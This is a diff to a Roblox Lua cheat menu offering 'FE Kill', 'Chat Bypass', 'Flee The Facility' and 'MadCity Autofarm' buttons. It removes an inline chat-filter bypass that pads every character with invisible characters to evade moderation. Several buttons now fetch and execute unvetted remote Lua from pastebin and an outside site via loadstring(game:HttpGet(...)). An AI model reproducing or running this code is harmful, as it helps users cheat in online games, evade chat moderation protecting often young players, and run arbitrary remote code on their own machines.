@@ -26,6 +26,8 @@ local CarCrusher = Instance.new("TextButton")
 local ChatBypass = Instance.new("TextButton")
 local FEKILL = Instance.new("TextButton")
 local FEKILLInvisible = Instance.new("TextButton")
+local Flee = Instance.new("TextButton")
+local MadCity = Instance.new("TextButton")
 local OwlHub = Instance.new("TextButton")
 --Working
 local Working1 = Instance.new("TextLabel")
@@ -36,6 +38,8 @@ local Workingcar = Instance.new("TextLabel")
 local WorkingChat = Instance.new("TextLabel")
 local Working4 = Instance.new("TextLabel")
 local Working5 = Instance.new("TextLabel")
+local WorkingFlee = Instance.new("TextLabel")
+local WorkingMadCity = Instance.new("TextLabel")
 local WorkingOwl = Instance.new("TextLabel")
 --Destroy GUI
 local DestroyGUI = Instance.new("TextButton")
@@ -377,88 +381,7 @@ ChatBypass.TextColor3 = Color3.new(0, 0, 0)
 ChatBypass.TextSize = 32
 ChatBypass.TextWrapped = true
 ChatBypass.MouseButton1Down:connect(function()
-	local lp = game:GetService("Players").LocalPlayer
-
-lp.Chatted:connect(function(msg)
-
-if msg:sub(0,2) == "/e" then
-
-msg = msg:gsub("a","a⁠")
-msg = msg:gsub("b","b⁠")
-msg = msg:gsub("c","c⁠")
-msg = msg:gsub("d","d⁠")
-msg = msg:gsub("e","e⁠")
-msg = msg:gsub("f","f⁠")
-msg = msg:gsub("g","g⁠")
-msg = msg:gsub("h","h⁠")
-msg = msg:gsub("i","i⁠")
-msg = msg:gsub("j","j⁠")
-msg = msg:gsub("k","k⁠")
-msg = msg:gsub("l","l⁠")
-msg = msg:gsub("m","m⁠")
-msg = msg:gsub("n","n⁠")
-msg = msg:gsub("o","o⁠")
-msg = msg:gsub("p","p⁠")
-msg = msg:gsub("q","q⁠")
-msg = msg:gsub("r","r⁠")
-msg = msg:gsub("s","s⁠")
-msg = msg:gsub("t","t⁠")
-msg = msg:gsub("u","u⁠")
-msg = msg:gsub("v","v⁠")
-msg = msg:gsub("w","w⁠")
-msg = msg:gsub("x","x⁠")
-msg = msg:gsub("y","y⁠")
-msg = msg:gsub("z","z⁠")
-
-msg = msg:gsub("A","A⁠")
-msg = msg:gsub("B","B⁠")
-msg = msg:gsub("C","C⁠")
-msg = msg:gsub("D","D⁠")
-msg = msg:gsub("E","E⁠")
-msg = msg:gsub("F","F⁠")
-msg = msg:gsub("G","G⁠")
-msg = msg:gsub("H","H⁠")
-msg = msg:gsub("I","I⁠")
-msg = msg:gsub("J","J⁠")
-msg = msg:gsub("K","K⁠")
-msg = msg:gsub("L","L⁠")
-msg = msg:gsub("M","M⁠")
-msg = msg:gsub("N","N⁠")
-msg = msg:gsub("O","O⁠")
-msg = msg:gsub("P","P⁠")
-msg = msg:gsub("Q","Q⁠")
-msg = msg:gsub("R","R⁠")
-msg = msg:gsub("S","S⁠")
-msg = msg:gsub("T","T⁠")
-msg = msg:gsub("U","U⁠")
-msg = msg:gsub("V","V⁠")
-msg = msg:gsub("W","W⁠")
-msg = msg:gsub("X","X⁠")
-msg = msg:gsub("Y","Y⁠")
-msg = msg:gsub("Z","Z⁠")
-msg = msg:gsub("1","1⁠")
-msg = msg:gsub("2","2⁠")
-msg = msg:gsub("3","3⁠")
-msg = msg:gsub("4","4⁠")
-msg = msg:gsub("5","5⁠")
-msg = msg:gsub("6","6⁠")
-msg = msg:gsub("7","7⁠")
-msg = msg:gsub("8","8⁠")
-msg = msg:gsub("9","9⁠")
-msg = msg:gsub("0","0⁠")
-
-local word = msg:sub(3)
-
-local tbl_main = 
-{
-      word,
-      "All"
-}
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
-
-end
-
-end)
+loadstring(game:HttpGet(('https://pastebin.com/raw/8YRmDC2p'),true))()
 end)
 ChatBypass.MouseButton1Down:connect(function()
     game.StarterGui:SetCore("SendNotification", {
@@ -781,6 +704,73 @@ Working5.TextSize = 14
 Working5.TextWrapped = true
 --
 --
+-- FLEE THE FACILITY
+--
+--
+Flee.Name = "Flee"
+Flee.Parent = Frame
+Flee.BackgroundColor3 = Color3.new(1, 1, 1)
+Flee.BorderSizePixel = 0
+Flee.Position = UDim2.new(0.025, 0, 0.669, 0)
+Flee.Size = UDim2.new(0, 200, 0, 50)
+Flee.Font = Enum.Font.SourceSansBold
+Flee.Text = "Flee The Facility"
+Flee.TextColor3 = Color3.new(0, 0, 0)
+Flee.TextSize = 32
+Flee.TextWrapped = true
+Flee.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/S8wi1WnD', true))()	
+end)
+
+WorkingFlee.Name = "WorkingFlee"
+WorkingFlee.Parent = Flee
+WorkingFlee.BackgroundColor3 = Color3.new(1, 1, 1)
+WorkingFlee.BackgroundTransparency = 1
+WorkingFlee.BorderSizePixel = 0
+WorkingFlee.Position = UDim2.new(1.06, 0, 0, 0)
+WorkingFlee.Size = UDim2.new(0, 114, 0, 50)
+WorkingFlee.Font = Enum.Font.SourceSansBold
+WorkingFlee.Text = "Working ✔"
+WorkingFlee.TextColor3 = Color3.new(0.333333, 1, 0)
+WorkingFlee.TextScaled = true
+WorkingFlee.TextSize = 14
+WorkingFlee.TextWrapped = true
+--
+--
+-- MAD CITY
+--
+--
+MadCity.Name = "MadCity"
+MadCity.Parent = Frame
+MadCity.BackgroundColor3 = Color3.new(1, 1, 1)
+MadCity.BorderSizePixel = 0
+MadCity.Position = UDim2.new(0.025, 0, 0.751, 0)
+MadCity.Size = UDim2.new(0, 200, 0, 50)
+MadCity.Font = Enum.Font.SourceSansBold
+MadCity.Text = "MadCity Autofarm"
+MadCity.TextColor3 = Color3.new(0, 0, 0)
+MadCity.TextSize = 32
+MadCity.TextWrapped = true
+MadCity.MouseButton1Down:connect(function()
+	Invisible = true
+        loadstring(game:HttpGet("https://jxnt-scripts.com/madlads/MadLadsAR.lua",true))()	
+end)
+
+WorkingMadCity.Name = "WorkingMadCity"
+WorkingMadCity.Parent = MadCity
+WorkingMadCity.BackgroundColor3 = Color3.new(1, 1, 1)
+WorkingMadCity.BackgroundTransparency = 1
+WorkingMadCity.BorderSizePixel = 0
+WorkingMadCity.Position = UDim2.new(1.06, 0, 0, 0)
+WorkingMadCity.Size = UDim2.new(0, 114, 0, 50)
+WorkingMadCity.Font = Enum.Font.SourceSansBold
+WorkingMadCity.Text = "Working ✔"
+WorkingMadCity.TextColor3 = Color3.new(0.333333, 1, 0)
+WorkingMadCity.TextScaled = true
+WorkingMadCity.TextSize = 14
+WorkingMadCity.TextWrapped = true
+--
+--
 -- OWL HUB
 --
 --
@@ -788,7 +778,7 @@ OwlHub.Name = "Owlhub"
 OwlHub.Parent = Frame
 OwlHub.BackgroundColor3 = Color3.new(1, 1, 1)
 OwlHub.BorderSizePixel = 0
-OwlHub.Position = UDim2.new(0.025, 0, 0.669, 0)
+OwlHub.Position = UDim2.new(0.025, 0, 0.833, 0)
 OwlHub.Size = UDim2.new(0, 200, 0, 50)
 OwlHub.Font = Enum.Font.SourceSansBold
 OwlHub.Text = "Owl Hub"
